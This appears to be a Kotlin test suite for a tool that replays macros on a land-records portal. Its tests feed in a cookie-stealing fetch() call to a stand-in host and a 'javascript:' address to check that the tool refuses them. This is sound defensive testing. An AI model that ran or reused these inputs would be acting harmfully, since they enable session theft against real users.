package ap.webland.core.test

import ap.webland.core.*

/** JSON, the .bwa format, UI.Vision macros, the table and the reports. */
object MacroTest {

    fun json() {
        Check.group("JSON - read as data, never run")
        val v = Json.parse("""{"a":"x","b":2,"c":true,"d":null,"e":[1,2],"f":{"g":"h"}}""")
        Check.equal("text", v.str("a"), "x")
        Check.equal("a whole number comes back whole", v.str("b"), "2")
        Check.equal("a number as a number", v.int("b"), 2)
        Check.equal("true", v.bool("c"), true)
        Check.equal("a list", v.arr("e").size, 2)
        Check.equal("a nested field", v.obj("f")?.str("g"), "h")
        Check.equal("a field that is not there", v.str("zz", "none"), "none")
        Check.equal("Telugu survives", Json.parse("""{"t":"పట్టా"}""").str("t"),
            "పట్టా")
        Check.equal("an escaped quote", Json.parse("""{"t":"a\"b"}""").str("t"),
            "a\"b")
        Check.threw("trailing rubbish is refused") { Json.parse("""{"a":1} x""") }
        Check.threw("an unclosed object is refused") { Json.parse("""{"a":1""") }
        Check.threw("a missing colon is refused") { Json.parse("""{"a" 1}""") }
        val back = Json.write(v, 0)
        Check.that("what is written reads back the same",
            Json.parse(back).str("a") == "x" && Json.parse(back).int("b") == 2)
        Check.equal("a backslash in a path is escaped and read back",
            Json.parse(Json.write(Json.of("p" to
                Json.s("G:\\BHANU\\dlr.pdf")))).str("p"), "G:\\BHANU\\dlr.pdf")
    }

    private fun sampleBwa(): String = """
    {"format":"B_WEBLAND_AUTOMATION","version":1,"name":"Add one record",
     "created_at":"2026-11-07 09:00:00","app_version":"18.0",
     "start_url":"https://webland2.ap.gov.in/POLR6/loginpage.aspx",
     "data_file":"NIVAGAM_ALL.csv","sheet":"DLR",
     "mapping":{"LPM":"LPMNo","Extent":"Extent"},
     "settings":{"beginner":true,"screenshots":true,"stop_after_failures":5},
     "steps":[
      {"id":"step_001","action":"click","target":{"id":"grAddRecord_txtlpmno_0",
        "label":"LPM No"},"value":"","wait":"visible","timeout":15000,
        "enabled":true},
      {"id":"step_002","action":"type","target":{"id":"grAddRecord_txtlpmno_0",
        "label":"LPM No"},"value":"{{LPM}}","wait":"visible","timeout":15000,
        "enabled":true},
      {"id":"step_003","action":"select","target":{
        "id":"grAddRecord_ddlLandNature1_0","label":"Land Nature"},
        "value":"పట్టా","wait":"visible","timeout":15000,"enabled":true},
      {"id":"step_004","action":"click","target":{"id":"btnAdd","text":"Add"},
        "value":"","semantic":"ADD","wait":"visible","timeout":15000,
        "enabled":true},
      {"id":"step_005","action":"wait","target":{},"value":"",
        "wait":"save_confirmation","timeout":30000,"enabled":true}
     ]}
    """.trimIndent()

    fun bwa() {
        Check.group("A recording is read through a gate")
        val auto = Macro.read(sampleBwa())
        Check.equal("its name", auto.name, "Add one record")
        Check.equal("five steps", auto.steps.size, 5)
        Check.equal("the start page is kept", auto.startUrl,
            "https://webland2.ap.gov.in/POLR6/loginpage.aspx")
        Check.equal("one step saves", auto.writes().size, 1)
        Check.equal("and it is the Add", auto.writes().first().id, "step_004")
        Check.equal("the columns it needs", auto.variables(), listOf("LPM"))
        Check.that("a step reads back in words",
            auto.byId("step_003")!!.describe().contains("Land Nature"))
        Check.equal("the chosen word", auto.byId("step_003")!!.value, "పట్టా")

        Check.group("and written out again without losing anything")
        val again = Macro.read(auto.write())
        Check.equal("same steps", again.steps.size, 5)
        Check.equal("same meaning on the Add",
            again.byId("step_004")!!.meaning, Meaning.ADD)
        Check.equal("same wait after it", again.byId("step_005")!!.wait,
            Wait.SAVE_CONFIRMATION)
        Check.equal("same Telugu", again.byId("step_003")!!.value, "పట్టా")

        Check.group("What the gate refuses")
        Check.threw("a file that is not a recording") { Macro.read("""{"a":1}""") }
        Check.threw("a newer version") {
            Macro.read(sampleBwa().replace("\"version\":1", "\"version\":9"))
        }
        Check.threw("a recording with no steps") {
            Macro.read("""{"format":"B_WEBLAND_AUTOMATION","version":1}""")
        }
        val odd = Macro.read(sampleBwa().replace("\"action\":\"select\"",
            "\"action\":\"run_program\""))
        Check.equal("an action it does not know is dropped", odd.steps.size, 4)
        Check.that("and the reason is reported",
            odd.trouble.any { it.contains("run_program") })

        val js = Macro.read(sampleBwa().replace(
            "https://webland2.ap.gov.in/POLR6/loginpage.aspx",
            "javascript:alert(1)"))
        Check.equal("a javascript: address is removed", js.startUrl, "")
        Check.that("and said so", js.trouble.any { it.contains("not http") })

        val secret = Macro.read(sampleBwa().replace(
            "\"value\":\"{{LPM}}\"", "\"value\":\"hunter2\",\"secret\":true"))
        Check.equal("a password in a file is replaced by the mark",
            secret.byId("step_002")!!.value, Macro.SECRET_MARK)
        Check.that("and the removal is reported",
            secret.trouble.any { it.contains("password") })

        Check.group("Checks before anything is played")
        val table = Table.of(listOf(listOf("LPMNo", "Extent"),
            listOf("1", "0.68"), listOf("3", "0.733")))
        val ok = Validate.check(auto, table, browserOpen = true)
        Check.that("this one may run", Validate.mayRun(ok))
        val noData = Validate.check(auto, null, browserOpen = true)
        Check.that("without its file it may not", !Validate.mayRun(noData))
        Check.that("and the reason names the column",
            noData.any { it.level == Level.STOP && it.detail.contains("{{LPM}}") })
        val noBrowser = Validate.check(auto, table, browserOpen = false)
        Check.that("nor with the portal closed", !Validate.mayRun(noBrowser))

        val twice = Macro.read(sampleBwa())
        twice.add(Step(act = Act.CLICK,
            target = Target(mapOf("id" to "btnAdd", "text" to "Add")),
            meaning = Meaning.ADD))
        Check.that("saving twice in one row is warned about",
            Validate.check(twice, table).any {
                it.level == Level.WARN && it.title.contains("saves 2 times")
            })

        Check.group("A button's words tell the player what it is")
        Check.equal("Add Record", Meaning.ofText("Add Record"), Meaning.ADD)
        Check.equal("Save and New is a save", Meaning.ofText("Save and New"),
            Meaning.SAVE)
        Check.equal("Submit", Meaning.ofText("Submit"), Meaning.SUBMIT)
        Check.equal("Cancel", Meaning.ofText("Cancel"), Meaning.CANCEL)
        Check.equal("nothing recognisable", Meaning.ofText("Yes"), Meaning.NONE)
        Check.that("a save writes to the portal", Meaning.SAVE.writes)
        Check.that("a search does not", !Meaning.SEARCH.writes)
    }

    private fun sampleUv(): String = """
    {"Name":"NIVAGAM PATTA ADD","CreationDate":"2026-11-04","Commands":[
     {"Command":"store","Target":"true","Value":"!ERRORIGNORE","Description":""},
     {"Command":"store","Target":"2","Value":"!TIMEOUT_WAIT","Description":""},
     {"Command":"store","Target":"${'$'}{!LOOP}","Value":"!csvReadLineNumber",
      "Description":""},
     {"Command":"csvRead","Target":"NIVAGAM_ALL.csv","Value":"","Description":""},
     {"Command":"click","Target":"linkText=Add Record","Value":"","Description":""},
     {"Command":"type","Target":"id=grAddRecord_txtlpmno_0",
      "Value":"${'$'}{!COL2}","Description":""},
     {"Command":"type","Target":"id=grAddRecord_txtlpmnoExtent_0",
      "Value":"${'$'}{!COL3}","Description":""},
     {"Command":"store","Target":"1","Value":"L10","Description":""},
     {"Command":"executeScript","Target":"return (function(){var e=document.getElementById('grAddRecord_ddlLandNature1_0');return (e&&e.options.length>1)?1:0;})();","Value":"L10","Description":""},
     {"Command":"if","Target":"${'$'}{L10}==0","Value":"","Description":""},
     {"Command":"pause","Target":"250","Value":"","Description":""},
     {"Command":"endif","Target":"","Value":"","Description":""},
     {"Command":"select","Target":"id=grAddRecord_ddlLandNature1_0",
      "Value":"label=${'$'}{!COL9}","Description":""},
     {"Command":"select","Target":"id=grAddRecord_ddlLandClassification1_0",
      "Value":"label=${'$'}{!COL10}","Description":""},
     {"Command":"click","Target":"id=btnAdd","Value":"","Description":""},
     {"Command":"echo","Target":"done lpm ${'$'}{!COL2}","Value":"","Description":""}
    ]}
    """.trimIndent()

    fun uiVision() {
        Check.group("The UI.Vision macros the surveyor already has")
        val macro = UvMacro.read(sampleUv())
        Check.equal("its name", macro.name, "NIVAGAM PATTA ADD")
        Check.equal("16 commands", macro.commands.size, 16)
        Check.equal("it names its CSV", macro.csvName(), "NIVAGAM_ALL.csv")

        val program = UiVision.compile(macro)
        Check.that("it compiles", program.mayRun())
        Check.equal("the Add button is the one write", program.writeCount, 1)
        Check.that("the script became a wait for the list",
            program.steps.any { it.op == UvOp.WAIT_LIST })
        Check.equal("and it kept the box's id",
            program.steps.first { it.op == UvOp.WAIT_LIST }.selector.value,
            "grAddRecord_ddlLandNature1_0")
        Check.that("which is said in the notes",
            program.notes.any { it.rule == "script" && it.level == Level.NOTE })
        Check.equal("the columns it reads",
            Validate.columnsUsed(program), setOf(2, 3, 9, 10))

        Check.group("A script this app does not recognise is never run")
        val risky = sampleUv().replace(
            "return (function(){var e=document.getElementById('grAddRecord_ddlLandNature1_0');return (e&&e.options.length>1)?1:0;})();",
            "fetch('http://example.com/'+document.cookie)")
        val riskyProgram = UiVision.compile(UvMacro.read(risky))
        Check.that("it is dropped",
            riskyProgram.steps.none { it.op == UvOp.WAIT_LIST })
        Check.that("and reported as not run",
            riskyProgram.notes.any {
                it.rule == "script" && it.level == Level.WARN &&
                    it.title.contains("not run")
            })
        Check.that("the rest of the macro still runs", riskyProgram.mayRun())

        Check.group("Loops and half-written conditions are refused")
        val looping = UiVision.compile(UvMacro.read(sampleUv().replace(
            "\"Command\":\"endif\"", "\"Command\":\"while\"")))
        Check.that("a while loop stops the file", !looping.mayRun())
        val unclosed = UiVision.compile(UvMacro.read(sampleUv()
            .replace("{\"Command\":\"endif\",\"Target\":\"\",\"Value\":\"\",\"Description\":\"\"},", "")))
        Check.that("an if with no endif stops it too", !unclosed.mayRun())
        val oddIf = UiVision.compile(UvMacro.read(sampleUv()
            .replace("\${L10}==0", "someFunction()")))
        Check.that("a condition that is not a comparison stops it",
            !oddIf.mayRun())

        Check.group("UI.Vision's own limits are reported, not copied")
        val high = UiVision.compile(UvMacro.read(sampleUv()
            .replace("!COL9", "!COL21").replace("!COL10", "!COL23")))
        Check.that("a column above 20 is flagged for the laptop",
            high.notes.any {
                it.rule == "uivision" && it.title.contains("column 21")
            })
        Check.that("but the macro still runs here", high.mayRun())
        Check.equal("and the columns are read",
            Validate.columnsUsed(high), setOf(2, 3, 21, 23))

        Check.group("A recording can go back out as a UI.Vision macro")
        val auto = Macro.read(sampleBwa())
        val written = UiVision.fromAutomation(auto, "NIVAGAM_ALL.csv")
        Check.that("it reads its CSV", written.csvName() == "NIVAGAM_ALL.csv")
        Check.that("the typed column became ${'$'}{!COL1}",
            written.commands.any { it.command == "type" && it.value.contains("!COL1") })
        Check.that("and it compiles again",
            UiVision.compile(UvMacro.read(written.write())).steps.isNotEmpty())
    }

    fun table() {
        Check.group("The spreadsheet, and matching its headings")
        val csv = "\uFEFFLineNo,LPMNo,Extent,SyNo,SubDiv,Khata,Name,Relation\r\n" +
            "2,1,0.680,212,212-4,222,\"యరింజల, సుబ్బమ్మ\",యరింజల\r\n" +
            "3,3,0.733,212,212-2,478,దాటి అప్పన్న,దాటి\r\n"
        val cells = Csv.parse(csv)
        Check.equal("three lines", cells.size, 3)
        Check.equal("the BOM is gone", cells[0][0], "LineNo")
        Check.equal("a comma inside quotes is one cell", cells[1][6],
            "యరింజల, సుబ్బమ్మ")
        val t = Table.of(cells)
        Check.equal("two rows", t.count(), 2)
        Check.equal("the row's own line number", t.lineOf(0), 2)
        Check.equal("a cell by name", t.cell(1, "Khata"), "478")
        Check.equal("nothing is blank", t.blankIn("Khata").size, 0)
        Check.equal("and nothing is empty", t.summary().empty, 0)

        val matched = Headings.match(Columns.COMMON, t.columns)
        fun pick(key: String) = matched.first { it.field == key }.column
        Check.equal("LPM No found", pick("lpm"), "LPMNo")
        Check.equal("extent found", pick("extent"), "Extent")
        Check.equal("survey number found, not the subdivision", pick("syno"), "SyNo")
        Check.equal("subdivision found", pick("subdiv"), "SubDiv")
        Check.equal("khata found", pick("khata"), "Khata")
        Check.equal("name found", pick("name"), "Name")
        Check.equal("the relation column is the father's name", pick("fname"),
            "Relation")
        Check.that("every one of them is sure",
            matched.filter { it.column != null }.all { it.certain })

        Check.group("Putting a row into a step")
        val row = t.rows[0]
        Check.equal("a mapped value", Bind.resolve("{{LPMNo}}", row), "1")
        val missing = ArrayList<String>()
        Check.equal("a column that is not there is LEFT AS WRITTEN",
            Bind.resolve("{{Chaltha}}", row, missing), "{{Chaltha}}")
        Check.equal("and reported", missing, listOf("Chaltha"))
        Check.equal("two in one value",
            Bind.resolve("{{SyNo}}-{{SubDiv}}", row), "212-212-4")
        Check.equal("names found in a value", Bind.namesIn("{{A}} and {{B}}"),
            listOf("A", "B"))
        Check.equal("a loose match still works",
            Bind.resolve("{{khata no}}", row), "222")

        Check.group("Duplicates and holes")
        val dup = Table.of(listOf(listOf("LPM", "Khata"),
            listOf("1", "222"), listOf("1", "478"), listOf("2", "")))
        Check.equal("one LPM twice", dup.duplicatesIn("LPM").size, 1)
        Check.equal("one khata missing", dup.blankIn("Khata"), listOf(2))
        val twoSame = Table.of(listOf(listOf("LPM", "LPM"), listOf("1", "2")))
        Check.equal("a repeated heading is renamed, not dropped",
            twoSame.columns, listOf("LPM", "LPM (2)"))
        Check.that("and said so", twoSame.trouble.isNotEmpty())
    }

    fun reports() {
        Check.group("The reports keep the source value")
        val t = Table.of(listOf(
            listOf("LPMNo", "Extent", "Khata", "LandNature"),
            listOf("1", "0.68", "222", "పట్టా"),
            listOf("2", "0.3333", "20000102", "ప్ర.భూమి"),
            listOf("3", "", "101234", "పట్టా")))
        val final = Reports.finalDlr(t, "Extent")
        Check.equal("the padded extent", final.rows[0][4], "0.680")
        Check.equal("and the file's own value beside it", final.rows[0][5], "0.68")
        Check.that("the note says only zeros were added",
            final.rows[0][6].contains("zeros added"))
        Check.equal("a fourth decimal is entered as it stands",
            final.rows[1][4], "0.3333")
        Check.that("and that is said plainly",
            final.rows[1][6].contains("more than 3 decimals"))
        Check.that("an empty extent is called out", final.rows[2][6].contains("no extent"))

        val govt = Reports.governmentLand(t, "Khata", "LandNature")
        Check.equal("one government row", govt.rows.size, 1)
        Check.that("and why it is there", govt.rows[0].last().contains("20000102"))

        val missing = Reports.missingData(t, listOf("Extent", "Khata"))
        Check.equal("one hole, in the extent", missing.rows.size, 1)

        val results = listOf(
            RowResult(2, RowState.SUCCESS, Codes.SAVE_CONFIRMED),
            RowResult(3, RowState.NEEDS_REVIEW, Codes.SAVE_UNKNOWN,
                "no answer from the portal"),
            RowResult(4, RowState.FAILED, Codes.SAVE_REFUSED, "please select"))
        val errors = Reports.errorsAndReview(results)
        Check.equal("the successes are left out", errors.rows.size, 2)
        Check.that("the Telugu advice is available",
            Reports.errorsAndReview(results, telugu = true).rows[0][4].isNotBlank())
        val summary = Reports.runSummary(results, 3, "09:00", "09:05", "Nivagam",
            "NIVAGAM PATTA ADD", "NIVAGAM_ALL.csv")
        Check.that("the summary says what may be retried",
            summary.rows.any { it[0].contains("retry") && it[1].contains("failed") })

        Check.group("What the app changed, field by field")
        val before = mapOf("Extent" to "0.68", "Khata" to "101234")
        val after = mapOf("Extent" to "0.680", "Khata" to "101234")
        val changed = Reports.changes(before, after)
        Check.equal("one change", changed.size, 1)
        Check.equal("and it names the old value", changed[0].second, "0.68")
    }

    fun run() {
        json(); bwa(); uiVision(); table(); reports()
    }
}
